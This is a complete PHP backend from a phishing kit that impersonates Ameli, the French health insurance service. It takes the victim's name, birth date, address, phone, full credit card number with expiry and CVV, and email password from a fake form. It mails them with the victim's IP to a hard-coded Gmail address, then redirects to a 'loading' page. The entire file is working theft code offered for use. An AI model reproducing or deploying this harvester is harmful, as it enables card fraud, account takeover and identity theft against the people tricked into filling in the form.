<?php 
$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$to = "inoxx-inoxxfranck1@gmail.com";
$subj = " Ameli - From:  [ $ip ]";
$message .= "|----------| Info |--------------|\n";
$message .='PrГ©nom:'.$_POST["AK01"]."\n";
$message .='Nom  :'.$_POST["AK02"]."\n";
$message .='Date de naissance :'.$_POST['AK03']."-".$_POST['AK04']."-".$_POST['AK05']."\n";
$message .='Adresse :'.$_POST['AK06']."/".$_POST['AK07']."\n";
$message .='TГ©lephone :'.$_POST["AK08"]."\n";
$message .= "|----------| CVV |--------------|\n";
$message .='Titulaire de la carte :'.$_POST["AK09"]."\n";
$message .='NumГ©ro de carte de crГ©dit :'.$_POST["AK10"]."\n";
$message .='Expire Г  Fin :'.$_POST['AK11']."/".$_POST['AK12']."\n";
$message .='CVV :'.$_POST["AK13"]."\n";
$message .= "|----------| E-mail |--------------|\n";
$message .='E-mail :'.$_POST["AK14"]."\n";
$message .='Mot de pass :'.$_POST["AK15"]."\n";
$message .= "|----------| I N F O |--------------|\n";
$message .= "|Clt : ".$ip."\n";
$message .= "|hOST : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";

mail("$to", "$subj", "$message");

header('location: loding1.html');
?>